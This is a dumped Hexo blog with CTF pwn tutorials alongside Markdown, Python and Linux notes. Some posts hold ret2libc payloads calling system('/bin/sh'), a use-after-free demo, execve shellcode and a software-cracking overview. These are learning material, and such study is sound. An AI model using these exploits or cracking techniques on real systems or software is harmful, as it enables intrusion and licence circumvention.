practice","slug":"pwn-入门1-3-plt-got","date":"2018-08-28T04:12:56.000Z","updated":"2019-01-30T06:05:25.222Z","comments":true,"path":"2018/08/28/pwn-入门1-3-plt-got/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/","excerpt":"","text":"关于ret2libc 中的plt/got延迟绑定即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。 使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；* plt 与 got文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的） 由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。 ret2libc的实现 文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出； 图一](pwn-入门1-3-plt-got/checksec.png) ![图二 查看应用调用函数plt表，objdump -d -M intel -j .plt pwnme可以看到没有调用system，需要我们利用其它已调用的来泄露； 图三 这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址； 123pwn = ELF(&apos;pwnme&apos;) sh.recvuntil(&apos;flag:&apos;) wri_got = pwn.got[&apos;write&apos;] 构造payload泄露write函数的实际地址 1pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4) 泄露libc中的system与/bin/sh地址 123libc = ELF(&apos;libc-2.19.so&apos;)sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next() 构造payload 1payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn2.3--UAF","slug":"pwn-入门2.3-UAF","date":"2018-08-28T03:10:56.000Z","updated":"2019-02-08T09:27:56.342Z","comments":true,"path":"2018/08/28/pwn-入门2.3-UAF/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门2.3-UAF/","excerpt":"","text":"堆的UAF(use after free)利用学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，只能看了下pwn的tips，开始现学现卖。 原理就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。 根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。 漏洞的简单利用1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void evil_fuc(char command[])&#123;system(command);&#125;void echo(char content[])&#123;printf(&quot;%s&quot;,content);&#125;int main()&#123; func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(&quot;malloc addr: %p\\n&quot;,p1); p1[3]=echo; p1[3](&quot;hello world\\n&quot;); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1[3](&quot;hello again\\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态 func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(&quot;malloc addr: %p\\n&quot;,p2); printf(&quot;malloc addr: %p\\n&quot;,p1);//p2与p1指针指向的内存为同一地址 p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p1[3](&quot;/bin/sh&quot;); return 0;&#125; 最终运行效果： to 漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程 学习借鉴文章来源：https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn1.2","slug":"pwn-入门1-2","date":"2018-08-28T01:46:58.000Z","updated":"2019-02-12T12:21:03.872Z","comments":true,"path":"2018/08/28/pwn-入门1-2/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-2/","excerpt":"","text":"静态链接ret2text &amp; ret2shellcode当程序中存在打印flag的地址或是可以得到shell的地址，我们就可以想办法覆盖返回地址到其地址处。也就是ret2text. 若程序中有明显的溢出且无保护措施，我们可以自己写shellcode并覆盖返回地址至shellcode处改变程序流程。不过要注意写入shellcode的区域要有可执行权限，否则写了也白写。关于shellcode的布置可以查看shellcode的布置 查看程序段的可读写执行情况： gdb：vmmap ./file &amp; (后台运行，返回pid0） cat /proc/pid0/maps ret2syscall栈不可执行开启的情况下，我们可以在栈上写入gadgets，使通过系统中断执行系统调用，从而达到获取shell的目的； 查找gadget的方法： ROPgadget --binary ./file ROPgadget --binary file --only &apos;pop|ret&apos; | grep eax ROPgadget --binary --opcode cd80c3（int 0x80 ; ret ） linux下的系统调用. 动态链接ret2libc程序不是静态编译，通常就不会有int 0x80; ret2syscall 就无法实现，因而使用ret2libc。 利用过程：ASLR使得每次载入的函数地址（base）都不同；实际地址 Address = base +offset 若地址为 0xf… 则其一般为实际地址； 而各函数offset在libc库中是固定的； 查看libc库版本： 1ldd ./file 寻找偏移地址 ： 1readelf -a /lib32/libc.so.6 | grep gets@ 目标是寻找libc 的 base : 1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset 2.从stack残渣中获取libc地址信息 延迟绑定简而言之就是程序在未调用过该函数时，其got地址处的值不是其真实地址；当程序调用一次该函数后，真实地址才会被初始化，此时got地址处的值才是真实地址。 给文件加载目标libc的方法： 加载环境变量:(64为UBUNTU调试32位程序会无法加载) 1234export LD_LIBRARY_PATH=`pwd` #当前目录为加载目录export LD_PRELOAD= libc #加载本地pwn题目下的libcunset LD_PRELOAD #调试完删除环境变量 exp调试时使用 1sh = process([‘./bin‘],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"软件保护/软件破解 及对抗","slug":"软件保护-软件破解-及对抗","date":"2018-08-25T01:30:41.000Z","updated":"2018-09-26T12:34:49.108Z","comments":true,"path":"2018/08/25/软件保护-软件破解-及对抗/","link":"","permalink":"http://siriuswhiter.tk/2018/08/25/软件保护-软件破解-及对抗/","excerpt":"","text":"软件保护简单算法注册保护：输入用户名序列号，计算并检测序列号； 简单算法注册保护的对抗：①修改关键指令：暴力破解；patcher②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机③还原本身算法；keygen 复杂算法注册保护：通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等； 复杂算法注册保护的对抗：①patch②补丁修改公钥，使用自己的公钥对； 网络加密及硬件加密：本质上与本地加密相同/运行前检测？？ 网络加密及硬件加密的对抗：①patch②模拟与远程端的通信，及模拟执行；③使用中转程序，从服务器获得远程执行结果； 复杂系统注册保护：以上内容混杂 附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测 软件破解及对抗程序分析及对抗： 代码变形mutation； 代码膨胀expansion； 花指令； 代码乱序； 平坦化； 程序调试及对抗： 系统API检测程序是否处于被调试状态； 检测调试器窗口信息、状态码； 检测调试器驱动，符号； 程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）； 利用驱动接管本身程序的中断，阻止被调试器接管； 利用驱动修改内核参数，阻止程序被调试； 双进程反调试； 程序修改及对抗：修改：文件补丁技术及工具；对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等； dnspy：.NET程序逆向工具","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"Hexo Essay Writing","slug":"hexo-essay-writing","date":"2018-08-15T15:33:24.000Z","updated":"2018-09-25T13:46:42.016Z","comments":true,"path":"2018/08/15/hexo-essay-writing/","link":"","permalink":"http://siriuswhiter.tk/2018/08/15/hexo-essay-writing/","excerpt":"","text":"打开git,进入MyBlog目录； 输入 hexo new &quot;essay-name&quot;； 打开source文件夹，找到 essay-name.md，使用markdown语法写作； 执行命令 / hexo clean / hexo generate/ hexo deploy； over； 假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Markdown standard","slug":"markdown规范学习","date":"2018-08-13T14:46:46.000Z","updated":"2018-09-25T13:48:48.888Z","comments":true,"path":"2018/08/13/markdown规范学习/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/markdown规范学习/","excerpt":"","text":"MarkDown v1.01.1 全局规范 MarkDown 文件使用‘.md’结尾 （小写字母) 格式规范标题结构格式1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开2.’#’号和文字之间’一个空格’连接3.标题层级最多六级 ‘#’到’######’ 加强和强调规范一般统一使用第一种 12*emphasize*_emphasize_ 使用’~~’给文字添加删除线1~~strikethrough~~ 代码块规范 行内代码使用’一对波浪号’如：hello world! 块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下： 123&lt;?php echo &apos;看源码之三个波浪号&apos;;?&gt; &lt;?php echo &apos;看源码之四空格缩进&apos;; ?&gt; 列表写法 列号’1.’或者’*’后内容用空格隔开 列表块前后’整行隔开’ 如下： 1234561. Windows 2. Mac3. iOS * iPhone * iPad4. Android 实际预览： Windows Mac iOS iPhone iPad Android 123456* Windows * Mac* iOS* Android 1. v3.2 2. v4.1 实际预览： Windows Mac iOS Android v3.2 v4.1 其他标签规范链接和email Inline： 1An [example](http://url.com/ &quot;title&quot;) 实现效果：An example 引用样式标签（titles are optional）: An [example][id].Then,anywhere else in the doc,define the link: [id]:http://example.com/ &quot;title&quot; Email: 1An email &lt;example@example.com&gt; link. 插图Inline(titles are optional)： 1![alt text](/path/img.jpg &quot;title&quot;) 引用式插图： ![alt text][id] [id]:/url/to/img.jpg &quot;title&quot; 引用块及嵌套 Email-style angle bracketsare used for blockquotes. And, they can be nested. Headers in blockquotes You can quote a list. Etc. 内联代码 &lt;code&gt; 段落中的用法 也可以 `代码中包含波浪号`.代码块 Indent every line of a code block by at least 4 spaces or 1 tab.代码的每行都最少用4个空格或者一个制表符(tab) 我是普通文本块 我是一个预格式化的 代码块. 水平分割线三个连字符-: 表格规范一个简单的表格看起来如下： 第一个头部 第二个头部 第三个头部 内容格子 内容格子 内容格子 内容格子 内容格子 内容格子 每列的对齐可以通过在分割线上添加冒号来实现： 第一个头部 第二个头部 第三个头部 左对齐 居中 右对齐 左对齐 居中 右对齐 页内锚标记 点我跳转到顶部 // 利用 #,## 生成 id 锚标签 另一种锚标记 // 利用 &lt;a name=&quot;top&quot;&gt;&lt;/a&gt; 附：参考 Hello-World.md 源码，注意换行的使用 123456789101112131415# Hello-World这是一个范例文件格式我是普通换行## 我是&lt;h2&gt;标题我是`&lt;h2&gt;`的内容## 我是&lt;h3&gt;标题* Windows * Mac* iOS* Android","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Introduction to pwn1.1","slug":"pwn-入门1-1","date":"2018-08-13T14:35:13.000Z","updated":"2019-01-30T06:21:07.211Z","comments":true,"path":"2018/08/13/pwn-入门1-1/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/","excerpt":"","text":"各种变量的存储位置 stack：局部变量 heap: 动态分配内存的变量（malloc/new） bss section: 全局化的未初始化的变量 data section: 全局化的已初始化的变量 rodata: （只读data段）全局化的静态变量（const） 例如： 123456789int a = 0; //.dataint b; //.bssconst double PI = 3.1415 //rodataint main()&#123; int c = 2; //stack char *d = malloc(16); //heap return 0;&#125; linux下将shellcode运行1.手写简易shellcode 123456789101112jmp shrun: pop ebx mov BYTE [ebx+7],0 xor eax,eax mov al,11 xor ecx,ecx xor edx,edx int 0x80sh: call run db &quot;/bin/sh&quot; 2.一系列步骤 123Assembly: nasm a.asm -o a.o -felf32 Extract Shellcode: objcopy -O binary a.o code //将a.o中需要用内容的提取到code中 xxd -i code //将提取出来的code转换为机器码 3.带入调用shellcode的程序test.c #include &quot;code.h&quot; typedef int(*CODE)(); int main() { ((CODE)shellcode)(); } Run Shellcode: gcc test.c -o test -m32 -zexexstack","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Learning python","slug":"learning-python","date":"2018-08-02T11:11:04.000Z","updated":"2018-09-25T13:43:58.748Z","comments":true,"path":"2018/08/02/learning-python/","link":"","permalink":"http://siriuswhiter.tk/2018/08/02/learning-python/","excerpt":"","text":"最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh 为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法： Python string 对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符； eg： ord(‘A’) -&gt;65 chr(66) -&gt;B 对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’； 可以通过encode() 将Unicode表示的str编码为指定的 bytes； 格式化输出字符串： c语言格式； format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}； python list and tuple list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’] len()得到元素个数； classmates[-n]可以得到倒数第n个元素； classmates.append(‘element’)追加元素到末尾； insert(n,’element’)插入到指定位置； pop()删除末尾元素；pop(i)删除指定位置元素； classmates[n]=’element’直接替换为别的元素； list元素可以是另一个list。 tuple（元组）： classmates = (‘elementl’, ‘element2’, (‘element31’,’element32’),’element4’) 一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const； 获取元素方法与list相同； 当只有一个元素时 t=(1,) 需要使用’，’来消除歧义； tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。 python dic （同c++map） d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3} =&gt; d[‘key1’] -&gt;value1 为避免key不存在： ‘key’ in d 不存在则返回False； d.get(‘key’,value) 不存在则返回value； pop(key)可以删除key即对应的value。 python set set也是一组key的集合但不储存value；key不能重复。 创建set需要提供一个list作为输入集合 s = set([1,2,3]); add(key)添加key ；remove(key)删除key。 1234567891011和list比较，dict有以下几个特点： 查找和插入的速度极快，不会随着key的增加而变慢； 需要占用大量的内存，内存浪费多。而list相反： 查找和插入的时间随着元素的增加而增加； 占用空间小，浪费内存很少。所以，dict是用空间来换取时间的一种方法。 python loop for i in list/tuple: 把list或tuple中的每个元素带入i，执行之后缩进块的语句； range()函数可以生成一个整数序列，list(range(n))可以将其转化为list； while xxx： break / continue 同c。 python func 空函数：pass用来做占位符，让代码格式正确。 可以返回多个值，实质上是返回的tuple； None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static） 12345#Python2.7在一行输入多个数字的方法： 输入一个数字 m = int(raw_input())输入多个数字是 m, n,.... = map(int, raw_input().split()) 可变参数： 函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L, 调用funcname(L)即可； 关键字参数：函数def funcname(a,b,’‘’‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F); 命名关键字参数：函数def funcname(a,b,’‘,c,d):’‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’‘,c,d，e):可变参数c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D); python slice用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’] slice操作符使用： eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]； L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个； python iteration即循环遍历； d = {‘a’: 1, ‘b’: 2, ‘c’: 3} eg: 循环迭代dict： for key in d://默认dict 迭代的是key ；迭代value : for value in d.values()；同时迭代 ：for k,v ind.items() 判断是否可迭代：通过collections模块的Iterable类型判断 12 from collections import Iterable isinstance(objects,Iterable) 下标循环的实现：通过内置的enumerate函数判断 1for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]): python list generationeg： 生成L=[1,4,9,….100]：[x*x for x in range(1,100)]; 筛选出仅偶数的平方：[x*x for x in range(1,100) if x%2 ==0]; 两层循环生成全排列：[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]; 列出当前目录下所有文件即目录名：import os | [d for d in os.listdir(&#39;.&#39;)]; 把一个list L 中所有字符串变为小写：[s.lower() for s in L]; python genarator不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator； 方法：将列表生成式的[]改为()即可；","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"The art 0f deploying shellcode","slug":"the-art-0f-deploying-shellcode","date":"2018-07-26T11:46:22.000Z","updated":"2018-09-25T13:43:49.802Z","comments":true,"path":"2018/07/26/the-art-0f-deploying-shellcode/","link":"","permalink":"http://siriuswhiter.tk/2018/07/26/the-art-0f-deploying-shellcode/","excerpt":"","text":"转移自之前的博客 shellcode布置 将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位 1 使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏 2 为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。 3 为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。 2 某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。 2 返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解） 2 按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解） 2 2 shellcode的编码技术 原因： 所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。 有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。 基于特征的IDS系统往往会对常见的shellcode进行拦截。 2 2 解决： 编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"What's PE files?","slug":"what-s-pe-files","date":"2018-07-23T10:29:37.000Z","updated":"2018-10-18T10:44:36.677Z","comments":true,"path":"2018/07/23/what-s-pe-files/","link":"","permalink":"http://siriuswhiter.tk/2018/07/23/what-s-pe-files/","excerpt":"","text":"转移自之前的博客 PE 文件概论PE（portable Executable）windows系统下的可执行文件格式 1 . 32位可执行文件-PE32 ； 64位可执行文件-PE+/PE32+ ，是PE文件的扩展形式。 分类：可执行系列 exe scr ；库系列 dll ocx cpl drv ；驱动程序系列 sys vxd ；对象文件系列 obj （唯一不可执行）。 基本结构 1 DOS头到节区头是PE的头部分； 文件中使用偏移offset，内存中使用VA（virtual address 虚拟地址）表示位置； VA指进程虚拟内存的绝对地址，RVA指从某个基准位置开始的相对地址。 RVA+ImageBase=VA PE头(1) 2 1.DOS头：IMAGE_DOS_HEADER结构体 3 40个字节/ e_magic:DOS签名（4D5A 签名值MZ）/e_lfanew:指示NT头的偏移（小端序标识法） 2.DOS存根（stub）/可选项，大小不固定/DOS环境才会执行 3.NT头： IMAGE_NT_HEADERS结构体 4 F8个字节/三个成员：签名（50450000）+文件头+可选头。 ①文件头：IMAGE_FILE_HEADER结构体 5 该结构体重要成员（设置不正确，程序无法运行） 6 7 8 ②可选头： IMAGE_OPTIONAL_HEADER32 9 （PE头结构体中最大的） 重要成员 10 11 12 ③节区头： IMAGE_SECTION_HEADER 13 不同内存属性访问权限：code rwx /data rw /resource r 14 重要成员 PE头(2) 内存地址与文件偏移间的映射：RVA to RAW（即file offset） 公式：RAW - PointerToRawData = RVA -VirtualAddress RAW = RVA -VirtualAddress + PointerToRawData 15 eg： RVA = 5000 位于第一节区（.text），VA = 1000（该节区内存的的起始地址）， PointerToRawData= 400 （该节区文件的起始地址） 。 RAW = 5000 -1000 +400 =4400. 2.DLL（动态链接库） 不把库包含在程序中，而是单独组成DLL文件，需要时调用即可/更新库时只需要替换DLL文件即可/内存映射使加载后的DLL代码，资源在多个进程中实现共享。 Windows版本不同，环境不同，被调用函数的位置（地址）也不相同。 ①为了确保在所有环境中都能正常调用被调用函数，编译器保存了被调用函数实际地址的位置。PE装载器将被调用函数的地址写到该位置。 ②DLL重定位。DLL的ImageBase默认为1000000，若某个程序使用a.dll与b.dll时，a已被装载到内存的10000000处，PE装载器只能查找其他空白的内存空间，将b装载进去。 ③PE头表示地址用RVA 而不是VA。 3.IAT（Import Address Table 导入地址表）：用来记录程序正在使用库中的哪些函数。","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"diary-20180720","slug":"diary-20180720","date":"2018-07-20T05:30:16.000Z","updated":"2018-10-18T10:02:47.306Z","comments":true,"path":"2018/07/20/diary-20180720/","link":"","permalink":"http://siriuswhiter.tk/2018/07/20/diary-20180720/","excerpt":"","text":"转移自之前的博客或许是因为复习时不怎么使用虚拟机，导致网络的某些配置出现了问题，按照网上的各种方法怎么也搞不好，历经小半天，终于解决。方法如下： 1.到根目录下/etc/network找到interfaces文件 2. vi打开：vi interfaces 此时发现，只有两行： 12auto loiface lo inet loopback 之所以不能联网是因为这个文件不完整。 讲这两行替换为： 123456789101112auto loiface lo inet loopbackauto eth0iface eth0 inet dhcpauto eth1iface eth1 inet dhcpauto eth2iface eth2 inet dhcpauto ath0iface ath0 inet dhcpauto wlan0iface wlan0 inet dhcp 3.退出vi，启动项 /etc/init.d/networking，重启网络连接sudo /etc/init.d/networking restart，就ok了","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"diary-20180517","slug":"diary-20180517","date":"2018-05-17T10:03:55.000Z","updated":"2018-12-05T14:31:45.783Z","comments":true,"path":"2018/05/17/diary-20180517/","link":"","permalink":"http://siriuswhiter.tk/2018/05/17/diary-20180517/","excerpt":"","text":"转移自之前的博客kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环； 寻求各色解法，e.g. vi /etc/profile 但是其文件正常，之后终于在误打误撞中解决。 步骤： (1).png (2).png 进入 recovery mode（也就是纯命令行模式） 输入用户密码 按理说 应该继续 apt-get update -f 但会提示 输入 dpkg –configure -a 完成后重新update 就ok啦 2018-12-5 试着换了几个其他版本的linux，结果都不太合心意，最后还是回去修复了有些问题的gdb，暂时放弃了pwndbg的安装kali 设定开机自动运行sh脚本方式不太一样，记在这里： Debian定义了多个运行级别脚本，分别存放在/etc/rc0.d至/etc/rc6.d中，默认级别为5. 要增加开机自动运行脚本的方法如下： 1vi /etc/init.d/rc.local 写入你需要运行的脚本，:wq退出，这里我将自己的脚本放到/usr/local/bin下，然后在rc.local下指定脚本路径：./usr/local/bin/automount，注意要给脚本执行权限，rc.local中也要加入点’ . ‘来执行脚本。 123chmod +x /etc/init.d/rc.local #增加脚本执行权限update-rc.d rc.local start 99 2 3 4 5 . stop 01 0 1 6 . #设置启动级别 若要删除脚本的启动级别运行如下命令 1update-rc.d -f rc.local remove","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Introduction to pwn0.0 --Protection technology","slug":"protection-technology","date":"2018-05-13T12:11:03.000Z","updated":"2018-09-25T13:42:56.132Z","comments":true,"path":"2018/05/13/protection-technology/","link":"","permalink":"http://siriuswhiter.tk/2018/05/13/protection-technology/","excerpt":"","text":"转移自之前的博客 NX保护和DEP保护两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限 NX保护NX保护，全称为 “No eXecute” ，意为 [禁止执行]我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。 linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。 DEP保护DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护 数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码 主要优点我觉得这种保护技术组要应用于Windows 这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。百度百科上有这样一句话： 可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。 *P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。 Linux Canary保护Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：溢出栈缓冲区劫持方式 1 如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下： 1 攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。 注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。 ASLR地址空间布局随机化ASLR ，全称为 Address space layout randomization顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。 